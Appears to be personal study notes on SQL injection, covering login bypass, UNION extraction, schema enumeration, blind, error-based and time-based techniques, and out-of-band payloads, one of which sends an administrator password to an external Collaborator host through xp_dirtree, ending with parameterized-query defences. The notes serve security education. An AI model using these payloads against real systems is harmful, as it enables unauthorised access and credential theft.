💡About These Notes:  These are my personal security engineering study notes, structured and refined with AI assistance. Feel free to use them as a comprehensive reference guide to master SQL Injection (SQLi)!

# 🧠 SQL Injection (SQLi) Master Notes

## 🧠 The Big Picture: What is SQLi?

The Analogy: Imagine a security guard at a club door who follows visitor instructions blindly. If you write your name as "VIP Guest; and hand over the master keys," the guard obeys.

SQLi happens when an app blindly trusts user input (like a search bar or login box) and feeds it directly into its database. Hackers type malicious database commands (SQL code) instead of normal text, tricking the database into doing things it was never supposed to do.

## 💥 Why It’s Dangerous (The Impact)

A successful SQLi attack is a hacker's golden ticket. It can lead to:

* Data Theft: Stealing passwords, credit card numbers, and private user files.
* Chaos: Modifying or deleting entire databases.
* Server Takeover: Escalating access to control the underlying web server.
* Permanent Backdoors: Leaving a hidden doorway open so hackers can quietly return whenever they want.

## 📍 Where Does It Hide?

Most people think it only happens in login forms (WHERE clauses), but SQLi can lurk anywhere the app talks to a database:

* UPDATE & INSERT statements: Changing user profiles or adding fake data.
* ORDER BY clauses: Manipulating how data is sorted.
* Table or Column names: Tricking the database into revealing structure names.

## 🕵️ How Do People Find It?

Testers and hackers probe every input box using specific "trick" inputs:

* The Quote Test ('): Typing a single quote to see if the app panics and throws a database error.
* Logic Tricks (OR 1=1): Injecting a statement that is always true, tricking the database into showing everything (e.g., bypassing a login screen).
* Time Delays: Forcing the database to pause for 10 seconds. If the page loads slowly, you know the code executed!
* Automated Scanners: Using tools like Burp Suite to blast thousands of tests automatically.

## 🎭 Common Types of SQLi Attacks

* Retrieving Hidden Data: Modifying a query to bypass filters and see things you shouldn't (like other people's orders).
* Subverting Logic: Breaking the app's intended rules (e.g., logging in as an admin without a password).
* UNION Attacks: Gluing results from a totally different database table onto your current screen.
* Blind SQLi: When the app doesn't show database errors on the screen, but hackers figure out the answers by asking true/false questions and watching how long the page takes to load.

---

## 🕵️‍♂️ Attack Style: Retrieving Hidden Data

The Goal: Trick the database into dropping its safety filters so you can see things you aren't supposed to see (like secret unreleased products or hidden categories).

### 🧩 Example 1: The Magic Comment (--)

The Normal Vibe: The website asks the database: “Show me gifts, AND make sure they are actually released (released = 1).”

The Hack: You type Gifts'-- into the URL category box.

Behind the Scenes (The Broken Query):

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Why it works: In SQL, -- is a comment indicator. It tells the database: "Ignore everything after this on the line." The database completely erases AND released = 1 from its memory. Suddenly, unreleased products pop up on your screen.

### 🔓 Example 2: The "Always True" Bypass (OR 1=1)

The Hack: You type Gifts' OR 1=1-- into the URL.

Behind the Scenes (The Broken Query):

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

Why it works: You are telling the database: “Show me items where the category is Gifts, OR 1 equals 1.” Since 1 always equals 1, the database says, "Well, that's a true statement!" and dumps every single product in the entire database onto your screen.

> ⚠️ Hacker Warning: Be extremely careful playing with OR 1=1. If the app takes your input and accidentally passes it into an UPDATE or DELETE query elsewhere, you could end up wiping out or modifying the entire database by accident!

---

## 🎭 Attack Style: Subverting Application Logic

The Goal: Bypass authentication completely and log into any account (like an administrator) without needing to know their password.

### 🧩 Example: The Comment-Out Bypass (--)

The Normal Vibe: The website verifies both your identity and your secret key: “Find a user where the username matches AND the password matches.”

The Hack: You type administrator'-- into the username box and leave the password field completely blank ('').

Behind the Scenes (The Broken Query):

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

Why it works: Just like before, the -- acts as a comment indicator. It tells the database to completely ignore everything from that point onward on the line.

The database erases AND password = '' from its memory.

It reduces the check to: “Does this username equal administrator?”

The database says yes, and instantly hands you the keys to the admin account with zero password required!

---

## 🔗 Attack Style: Retrieving Data from Other Database Tables (UNION Attacks)

The Goal: Steal data from completely unrelated database tables (like user passwords) by gluing your own custom query onto the original one.

### 🧩 Example: The UNION Glue Attack

The Normal Vibe: The website asks the database for standard info from one table: “Give me the name and description of products in the Gifts category.”

The Hack: You type ' UNION SELECT username, password FROM users-- into the search box.

Behind the Scenes (The Broken Query):

`SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'`

Why it works:

* The UNION keyword acts like a giant glue stick. It tells the database: "Take the results of my first query, and stick the results of this second query right underneath them."
* The -- comments out whatever was left at the end of the original query so it doesn't cause a syntax error.

Boom! The app thinks it's just displaying normal product descriptions, but instead, it hands you a bonus list containing every single username and password from the database.

---

## 🔗 Attack Style: SQL Injection UNION Attacks (The Golden Rules)

The Goal: Glue your own custom query onto an existing one using UNION to extract hidden data right onto the screen—if you can follow the database's strict rules.

### 🧩 How UNION Works

The Concept: The UNION keyword acts like a giant glue stick. It takes the results of the application's original query and appends your custom query's results right below them into a single result set.

The Blueprint:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This merges the columns from both tables together so you can see them both at once.

### 🛑 The Two Golden Rules for UNION Attacks

For a UNION query to actually work without throwing a database error, your attack must satisfy two strict requirements:

* The Same Number of Columns: Both the original query and your injected query must return an identical number of columns. (If the original app asks for 2 columns, your injected query can't try to output 3).
* Compatible Data Types: The data types in each column position must match up (e.g., if column one expects text, your injected query's first column must also be text).

### 🕵️‍♂️ The Hacker's Checklist (How to Prep)

Before you can successfully steal data with a UNION attack, you have to play detective and figure out two vital pieces of information:

* Column Count: Exactly how many columns are being returned by the original query?
* Data Types: Which of those columns have a suitable data type (like text) to carry your stolen data back to the browser screen?

---

## 🔢 Attack Style: Determining the Column Count (The Two Methods)

The Goal: Figure out the exact number of columns returned by the original query so your UNION attack doesn't crash from a column mismatch.

There are two primary methods to crack this code:

### 📉 Method 1: The ORDER BY Trick

The Concept: The database lets you sort results using numbers instead of column names (e.g., ORDER BY 1 sorts by the first column).

The Hack: You inject a series of incremental ORDER BY commands into the input:

`' ORDER BY 1--`
`' ORDER BY 2--`
`' ORDER BY 3--`

Why it works: You keep incrementing the number. As long as the column exists, the query runs fine. But the second your number exceeds the actual column count, the database panics and throws an error (e.g., "Position number 3 is out of range").

The Cue: Watch the application's response. The exact number right before the errors start appearing is your total column count!

### 🕳️ Method 2: The NULL Value Technique

The Concept: You test your UNION attack directly by appending NULL values until the column counts match up.

The Hack: You submit a growing chain of NULL inputs:

`' UNION SELECT NULL--`
`' UNION SELECT NULL,NULL--`
`' UNION SELECT NULL,NULL,NULL--`

Why NULL? NULL is the ultimate universal adapter—it is automatically compatible with every common data type (text, numbers, dates), minimizing errors while you test.

Why it works:

* If your NULL count doesn't match the original query's columns, the database rejects it with an error.
* When your NULL count finally matches, the database happily executes the query and tacks on an extra row of empty values. If you're lucky, you'll see a weird extra row or subtle change on your screen, letting you know you've nailed the exact column count!

---

## 🌐 Attack Style: Database-Specific Syntax (The Quirks)

The Goal: Adapt your payloads to handle different database engines (like Oracle or MySQL) because databases have unique formatting rules and won't accept a one-size-fits-all injection.

### 🏛️ Oracle: The Mandatory FROM DUAL Rule

The Quirks: Oracle is extremely strict. Every single SELECT query must include the FROM keyword and name a real table—otherwise, it throws a syntax error.

The Fix: Oracle comes with a special built-in dummy table just for testing called DUAL.

The Payload:

`' UNION SELECT NULL FROM DUAL--`

Why it works: By appending FROM DUAL, you satisfy Oracle's strict structural rules, allowing your UNION injection to run smoothly.

### 🐬 MySQL: The Comment Nuances (-- vs #)

The Quirks: MySQL can be picky about how you comment out the rest of a query using the double-dash (--) sequence.

The Fix:

* The Space Requirement: In MySQL, the double-dash must always be followed immediately by a space (or a tab/newline) so the database knows it's a comment (-- ). If you omit the space, MySQL thinks it's a math operator and breaks.
* The Hash Alternative: Alternatively, you can use the hash character (#) as a comment indicator to wipe out the rest of the query:

`' UNION SELECT NULL#`

---

## 🔤 Attack Style: Finding Columns with a Useful Data Type

The Goal: Discover which specific column position can handle text/strings so you can use it as a delivery vehicle to smuggle out stolen data.

### 🧩 The Concept

The juicy data you actually want to steal (like usernames, passwords, and credit card numbers) is almost always in string (text) format.

If you try to glue a text string into a database column that only accepts numbers (integers), the database will instantly reject it.

Once you know the total column count, you have to test each position one by one to see which ones are text-friendly.

### 🛠️ The Hack: The Moving String Test

Assuming the original query returns four columns, you test them sequentially by dropping the letter 'a' into a different slot each time while keeping the rest as NULL:

`' UNION SELECT 'a',NULL,NULL,NULL--`
`' UNION SELECT NULL,'a',NULL,NULL--`
`' UNION SELECT NULL,NULL,'a',NULL--`
`' UNION SELECT NULL,NULL,NULL,'a'--`

### 🎯 Why It Works & How to Read the Results

* The Error Cue (The Fail): If you drop 'a' into a column meant for numbers, the database throws a type-conversion error (e.g., "Conversion failed when converting the varchar value 'a' to data type int"). Time to test the next column!
* The Jackpot Cue (The Success): If the query executes cleanly and the letter a actually renders somewhere on the webpage, congratulations! You have officially found a text-compatible column. You can now swap out that 'a' for a real database column name (like username) to steal real data!

---

## 🔓 Attack Style: Stealing Interesting Data with UNION

The Goal: Extract juicy secrets (like usernames and passwords) from secondary database tables once you've successfully mapped out the column count and text-friendly columns.

### 🧩 The Setup & The Payload

The Scenario: Imagine the original query returns two columns, both of which are text-friendly, and you suspect (or know) there is a table called users with columns named username and password.

The Hack: You type this payload into the vulnerable input point:

`' UNION SELECT username, password FROM users--`

### 🎯 Why It Works

* Closing the String: The initial ' closes the application's original string parameter.
* The Match: Your injected SELECT username, password FROM users perfectly matches the application's requirement of returning two text-compatible columns.
* Killing the Tail: The -- comments out the rest of the original query so it doesn't cause syntax errors.
* The Jackpot: The application stitches your stolen data right onto the screen alongside normal results, handing you a complete list of credentials!

### 🧩 The Catch: What if You Don't Know the Names?

To pull this off, you normally need to know the exact names of the tables (users) and columns (username, password).

If you don't know them, you would usually have to guess blindly. However, all modern databases provide built-in system tables and information schemas that let you query the database's own structure to discover every table and column hiding inside!

---

## 🧬 Attack Style: Retrieving Multiple Values in a Single Column

The Goal: Extract multiple pieces of sensitive data (like usernames and passwords) even when the original query only gives you a single text-compatible column to work with.

### 🧩 The Concept: String Concatenation

If the original app only has one valid text column, a standard UNION SELECT username, password will fail because it tries to return two columns.

The workaround? Glue them together! You combine multiple database fields into a single string output separated by a custom symbol so you can read them apart.

### 🛠️ The Hack (Oracle Example)

You inject a query that uses a string concatenation operator and a delimiter (like a tilde ~):

`' UNION SELECT username || '~' || password FROM users--`

### 🎯 Why It Works

* The Glue (||): The double-pipe sequence (||) acts as a string concatenation operator in Oracle (and several other databases). It merges fields together.
* The Delimiter (~): By wrapping a unique separator like '~' in the middle, you keep the data organized. Without it, administrator and s3cure would mush together into administrators3cure, making it impossible to separate.
* The Jackpot Result: The database squashes the data into one clean column output on your screen:

...
administrator~s3cure
wiener~peter
carlos~montoya
...

> ⚠️ Database Quirk Warning: Every database engine has its own way of doing concatenation! While Oracle uses ||, other databases (like MySQL) require entirely different syntax, such as the CONCAT() function.

---

## 🔍 Attack Style: Examining the Database (Version Fingerprinting)

The Goal: Figure out exactly what database software and version a website is running (like MySQL, Oracle, or Microsoft SQL Server) so you can tailor your future attacks to its specific quirks.

### 🧩 The Concept: Database Fingerprinting

Every database brand has its own unique system variables or built-in functions to report its version.

By injecting provider-specific queries via a UNION attack, you can force the database to spit its version details right onto your screen.

### 🛠️ The Cheat Sheet: Version Queries by Database Type

Depending on what you're targeting, you use a different syntax payload:

* Microsoft / MySQL: `SELECT @@version`
* Oracle: `SELECT * FROM v$version`
* PostgreSQL: `SELECT version()`

### 🎯 The Hack & The Result (Microsoft Example)

If you suspect a Microsoft SQL Server, you inject a payload like this:

`' UNION SELECT @@version--`

Why it works: The database evaluates @@version, grabs its internal build details, and glues them straight into your application's response output.

The Jackpot Result: You instantly confirm the exact underlying technology and security patches:

Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0  (Build 14393: ) (Hypervisor)

---

## 📋 Attack Style: Listing the Contents of the Database (Information Schema)

The Goal: Map out the entire architecture of the target database—discovering all hidden tables and column names—by querying the database's own built-in metadata catalog.

### 🧩 The Concept: The Information Schema

Most modern databases (with the exception of Oracle) maintain a built-in set of read-only views called the information_schema.

Think of this as the database's blueprint directory. Instead of guessing table names, you can query this schema directly using a UNION attack to get a complete map of everything inside.

### 🔍 Step 1: Listing All Tables (information_schema.tables)

The Query: You ask the database to dump its table directory:

`SELECT * FROM information_schema.tables`

The Output Result: The database returns a structural layout of its contents:

#### (This is a table, please see it from the "Code" view)

# TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE

MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

Why it works: Instantly, you spot high-value targets you couldn't see before—like a table named Users hiding right alongside the public products.

### 🔍 Step 2: Listing Columns in a Specific Table (information_schema.columns)

The Query: Once you know a table exists (e.g., Users), you query the columns view and filter by that table name:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

The Output Result: The database spills the exact column breakdown and their data types:

#### (This is a table, please see it from the "Code" view)

# TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE

MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

Why it works: You now have the exact blueprint (UserId, Username, Password) needed to launch a targeted data-theft attack or craft precise UNION queries!

---

## 🏛️ Attack Style: Listing the Contents of an Oracle Database

The Goal: Map out the tables and columns inside strict Oracle databases using Oracle's native metadata catalog instead of the standard information_schema.

### 🧩 The Concept: Oracle's Custom Metadata Views

Unlike most other modern databases, Oracle does not support information_schema.

If you try to query information_schema on an Oracle database, your attack will fail. Instead, Oracle uses its own proprietary system views—all_tables and all_tab_columns—to store its structural blueprint.

### 🔍 Step 1: Listing All Tables (all_tables)

The Query: You ask Oracle to dump its table directory:

`SELECT * FROM all_tables`

Why it works: This query returns a list of every table name accessible to the current database user, letting you scout out hidden targets like user accounts or administrative records.

### 🔍 Step 2: Listing Columns in a Specific Table (all_tab_columns)

The Query: Once you identify a high-value table, you query Oracle's column view to map out its structure:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

Why it works:

* It filters down to show every individual column belonging to that specific table.

> ⚠️ The Oracle Quirk: Oracle stores table and column names in uppercase by default. If your query looks for lowercase 'users', Oracle won't find a match and will return empty results—always capitalize your target names (e.g., 'USERS')!

---

## 👁️ Attack Style: Blind SQL Injection (The Stealth Mode)

The Goal: Extract sensitive data or confirm vulnerabilities even when the website gives you zero visual feedback, no error messages, and no query results on the screen.

### 🧩 The Concept: The Vault Door

What makes it "Blind"? The application is vulnerable to SQL injection, but it acts like a locked vault. It executes your injected database commands entirely behind the scenes, without ever printing the results or debugging errors onto your web page.

The Analogy: It’s like whispering a question to someone who can only answer by either nodding or staying completely silent. You can still get your answers, but you have to ask questions very differently.

### 🛑 Why Standard Attacks Fail

Techniques like UNION attacks rely entirely on the website displaying the results of your query right back to your browser window.

If the application swallows the output and only shows a generic "Welcome" or "Product Not Found" page, UNION attacks hit a brick wall.

### 🎯 The Takeaway & What's Next

Just because you can't see the database data directly doesn't mean the website is safe.

To crack a blind SQL injection vulnerability, hackers have to use completely different stealth techniques—such as forcing the app to behave differently based on True/False questions, or making the server stall for a few seconds to leak data letter by letter!

---

## 🎛️ Attack Style: Exploiting Blind SQLi via Conditional Responses (The Yes/No Game)

The Goal: Extract secret data (like an administrator's password) character by character when the website gives you zero data output, using only a binary Yes/No clue (like a "Welcome back" message).

### 🧩 The Concept: The 20 Questions Game

The Scenario: Imagine a website tracking your visit via a cookie header (TrackingId=u5YD3PapBcR4lN3e7Tj4). Behind the scenes, it checks the database:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

The Clue: If the database finds a match, it prints a "Welcome back" message. If it finds nothing, the message disappears.

The Hack: Even though you can't see the database contents, you can turn the app into an oracle by forcing it to answer True/False questions!

### 🧪 Testing True vs. False Conditions

You inject mathematical or logic conditions into your cookie value to see how the app reacts:

* The True Test (AND '1'='1'):
* Payload: `xyz' AND '1'='1`
* Result: The statement is true, the query returns data, and you see "Welcome back".


* The False Test (AND '1'='2'):
* Payload: `xyz' AND '1'='2`
* Result: The statement is false, no data is returned, and the "Welcome back" message vanishes.



### 🕵️‍♂️ The Hack: Extracting Data Character by Character

By chaining conditional logic with database functions like SUBSTRING, you can guess sensitive data (like the admin password) one letter at a time like playing Higher/Lower:

Is it greater than 'm'?

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

Outcome: "Welcome back" appears -> True! The first letter is past 'm' in the alphabet.

Is it greater than 't'?

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

Outcome: No message -> False! The letter is between 'n' and 't'.

Is it equal to 's'?

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

Outcome: "Welcome back" appears -> Bingo! You have successfully brute-forced the first character (s). Rinse and repeat for character 2, 3, and so on until the whole password is exposed!

> ⚠️ Database Quirk Warning: While standard SQL uses SUBSTRING(), some database engines require you to use SUBSTR() instead. Always match your function to the target database type!

---

## 💥 Attack Style: Error-Based SQL Injection (Triggering Conditional Errors)

The Goal: Extract secret data when the website completely ignores normal True/False page changes, by forcing the database to intentionally crash and throw a math error only when your guess is right.

### 🧩 The Concept: The Trap Door

The Scenario: Sometimes a website is completely stubborn—it shows the exact same web page whether your SQL query succeeds or fails, rendering standard "Yes/No" checks useless.

The Hack: You use conditional statements (CASE WHEN) to lay a mathematical trap. You tell the database: "If my guess is true, try to divide by zero (1/0). If it's false, just return a normal letter ('a')."

### 🧪 Testing the Math Trap (1/0 vs 'a')

You inject a CASE statement into your cookie or input to force a crash conditionally:

* The False Test (1=2 -> No Error):
* Payload: `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
* Result: The condition is false, so it evaluates to 'a'. No crash occurs, and the app responds normally.


* The True Test (1=1 -> Division Error):
* Payload: `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
* Result: The condition is true, so it hits 1/0 (divide-by-zero). The database panics, throws an unhandled error, and alters the app's HTTP response.



### 🕵️‍♂️ The Hack: Exposing Data via Crash Detection

Just like before, you can chain this logic with SUBSTRING to guess administrative passwords letter by letter. If the page throws an error, your guess was true:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

Why it works:

* If the administrator's password actually starts with a letter greater than 'm', the CASE statement triggers 1/0.
* The resulting database crash changes the application's response, confirming your guess.
* You systematically iterate through characters until the entire sensitive string spills out through error messages!

---

## 📢 Attack Style: Extracting Data via Verbose SQL Error Messages (The Accidental Leak)

The Goal: Smuggle secret data directly out through database error messages by intentionally triggering a data-type mismatch, transforming a totally blind injection into an instantly visible one.

### 🧩 Concept 1: Structural Debugging (Leaking the Blueprint)

The Scenario: When a database is misconfigured, it acts like a blabbermouth. If you inject a single quote ('), it doesn't just fail silently—it spits out a verbose error message revealing its inner thoughts:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''`

Why it's a goldmine: The error message literally prints out the entire SQL query the application constructed. You can see instantly where your input lands (e.g., inside a single-quoted string), allowing you to craft a precise payload and use comments (--) to fix syntax breaks.

### 🧩 Concept 2: The Data-Type Trap (CAST())

The Concept: If the application hides normal data outputs, you can force the database to leak secrets by abusing type conversion errors.

The Tool: The CAST() function lets you convert data from one type to another (like turning text into an integer).

The Payload:

`CAST((SELECT example_column FROM example_table) AS int)`

### 🎯 Why It Works (Turning Blind SQLi Visible)

* The Trap: You are asking the database to perform an impossible task: "Take this secret text string and force it to become an integer number."
* The Crash: The database panics because text doesn't fit into a number format.
* The Jackpot Error: Instead of failing quietly, the database throws an error that literally prints your secret data out loud inside the error message:

`ERROR: invalid input syntax for type integer: "Example data"`

Boom! Just like that, your blind SQL injection is no longer blind. The secret data spills right onto your screen inside the error text.

> 💡 Bonus Pro-Tip: This trick is also a lifesaver when an input field has a strict character limit, making it too short to run bulky conditional or brute-force blind payloads!

---

## ⏳ Attack Style: Exploiting Blind SQLi via Time Delays (The Stopwatch Trick)

The Goal: Extract secret data or confirm vulnerabilities when the website is completely silent—hiding errors, showing identical pages, and ignoring standard tricks—by forcing the server to freeze and stall your stopwatch.

### 🧩 The Concept: The Paused Stopwatch

The Scenario: What happens when a website is bulletproof against visual cues and handles database errors so gracefully that nothing ever changes on screen? Standard blind techniques hit a dead end.

The Hack: Because web servers process queries synchronously (waiting for the database to finish before replying), you can weaponize time. You tell the database: "If my guess is true, put on the brakes and sleep for 10 seconds. If it's false, reply instantly."

The Cue: You don't look at the web page text anymore—you look at your browser's load time. If the page hangs, your condition was true!

### 🧪 Testing the Delay (Microsoft SQL Server Example)

You inject conditional IF statements paired with a sleep command into your input:

* The False Test (1=2 -> Instant Reply):
* Payload: `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
* Result: The condition is false, so the database skips the delay. The page loads immediately.


* The True Test (1=1 -> 10-Second Freeze):
* Payload: `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
* Result: The condition is true, so the database hits WAITFOR DELAY '0:0:10'. Your browser hangs for a full 10 seconds before the page finally renders.



### 🕵️‍♂️ The Hack: Exposing Data via Stopwatch

Just like with previous blind attacks, you can combine this with SUBSTRING and database counts to brute-force passwords character by character without ever seeing a single piece of data on your screen:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

Why it works:

* If the administrator's password starts with a letter greater than 'm', the query matches, and the server stalls for 10 seconds.
* If it doesn't match, the server replies instantly.
* By timing your requests with a stopwatch, you can systematically map out the entire password letter by letter in absolute silence!

> ⚠️ Database Quirk Warning: Just like everything else in SQL, time-delay commands are completely database-specific! While Microsoft SQL Server uses WAITFOR DELAY, other databases like PostgreSQL, MySQL, or Oracle use entirely different functions (like pg_sleep() or DBMS_PIPE.RECEIVE_MESSAGE).

---

## 📡 Attack Style: Out-of-Band (OAST) Blind SQL Injection (The Carrier Pigeon)

The Goal: Confirm vulnerabilities and exfiltrate data when a web app is completely asynchronous—meaning it gives you zero visual clues, hides errors, ignores timeouts, and never replies back on the main web thread.

### 🧩 The Concept: The Carrier Pigeon

The Scenario: What happens when an application processes your tracking cookie in the background on a separate thread? It replies to your browser instantly with a generic response, while the vulnerable SQL query runs completely out of sight. Standard tricks (like timers or error pages) fail because the web page doesn't wait for or care about the database's struggles.

The Hack: Since you can't see the response on your screen, you weaponize the internet itself! You force the database to send a network request outward to a server you control, using a carrier pigeon to deliver your answers.

### 🛠️ The Tool: Burp Collaborator

The Setup: Hackers use a special utility called Burp Collaborator—a dedicated server that listens for incoming network pings, specifically DNS (Domain Name Service) queries.

Why DNS? Most corporate and production networks block outbound web traffic (HTTP), but they almost always allow free egress for DNS queries because servers constantly need them to look up website addresses.

### 🧪 The Payload (Microsoft SQL Server Example)

You inject a command that forces the database to trigger an external file path lookup:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

### 🎯 Why It Works

* The Trap: The database executes the built-in system command (xp_dirtree), which instructs it to look at a network folder path.
* The Ping: To find that folder, the database server is forced to reach out across the public internet to resolve your custom domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

* The Jackpot: Your Burp Collaborator server catches the incoming DNS lookup request live in real-time. Even though the website web page gave you absolute silence, your private server lights up, instantly confirming that your SQL injection successfully executed!

> ⚠️ Database Quirk Warning: Just like everything else in SQL, out-of-band commands are completely database-specific! While Microsoft SQL Server uses xp_dirtree or xp_cmdshell, other databases (like Oracle, PostgreSQL, or MySQL) require entirely different functions or network protocols (like XML external entity loading or database-specific HTTP request triggers) to force an outbound ping.

---

## 📦 Attack Style: Exfiltrating Data via Out-of-Band OAST (The Data Smuggler)

The Goal: Steal sensitive data (like passwords) in a single shot by smuggling the secret out inside the domain name of an outbound network request.

### 🧩 The Concept: Smuggling Data Through Domain Names

The Scenario: Once you know you can trigger outbound network pings, you aren't limited to just detecting whether an injection works—you can actually make the database leak raw data directly to your private server.

The Hack: How do you send data through a DNS query? You append the secret text right onto the front of your custom domain name! Because DNS requests must look up that exact web address, your private server will receive the secret data written plainly inside the incoming lookup request.

### 🛠️ The Payload (Microsoft SQL Server Example)

You inject a script that grabs the administrator's password, stores it in a temporary variable, and glues it into the network path:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

### 🎯 Why It Works & The Jackpot Result

* Variable Capture: The script fetches the administrator's password from the database and saves it into the variable @p.
* The Glue: It dynamically builds a folder path by stitching the password string right into your Collaborator domain:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

* The Lookup: The database fires off a DNS lookup to find that address.
* The Jackpot: Your Burp Collaborator log instantly lights up, displaying the captured password sitting right inside the incoming domain query!

### 👑 Why OAST is the Ultimate Hacker Shortcut

* No Brute-Forcing Needed: Instead of guessing characters one by one with time delays or error codes, OAST allows you to exfiltrate entire chunks of data all at once.
* Total Silence: It works even when the web application gives you zero visual feedback, hides errors, and processes requests asynchronously. For these reasons, security professionals often prefer OAST techniques over every other blind method!

---

## 🛡️ Security Style: Preventing SQL Injection (The Shield)

The Goal: Completely neutralize SQL injection vulnerabilities by enforcing a strict structural separation between application code and untrusted user input using Parameterized Queries (Prepared Statements).

### 🧩 The Concept: Code vs. Data Isolation

* The Flaw of Concatenation: When you glue user input directly into a SQL string (+ input +), the database engine can't tell the difference between your original command structure and a malicious payload. It executes the whole thing as code.
* The Fix: Parameterized queries use placeholders (like ?) to tell the database: "Here is the rigid blueprint of my query, and here is a separate compartment containing the raw data. Treat the data strictly as a literal value—never as executable code!"

### 🛠️ The Implementation: Unsafe vs. Safe Code

Vulnerable Code (String Concatenation):

`String query = "SELECT * FROM products WHERE category = '"+ input + "'";`
`Statement statement = connection.createStatement();`
`ResultSet resultSet = statement.executeQuery(query);`

Secure Code (Parameterized Query / Prepared Statement):

`PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");`
`statement.setString(1, input);`
`ResultSet resultSet = statement.executeQuery();`

### ⚠️ The Limitations: Where Parameters Don't Work

Parameterized queries are a silver bullet for any situation where untrusted input acts as data (such as inside WHERE clauses, or values within INSERT and UPDATE statements).

The Catch: You cannot use parameters for structural parts of a query, such as table names, column names, or ORDER BY clauses.

If your application logic requires user input in these structural spots, you must use alternative defenses:

* Whitelisting: Restrict input exclusively to a rigid list of permitted values.
* Different Logic: Redesign the application code to avoid dynamic structural changes.

### 👑 The Golden Rule: Zero Hybrid Code

For a parameterized query to keep you safe, the query string must always be a hard-coded constant.

It must never contain dynamic variables from any source. Never be tempted to decide case-by-case whether an item of data is "trusted"—it is entirely too easy for mistakes to slip in or for future code changes to taint data you thought was safe!
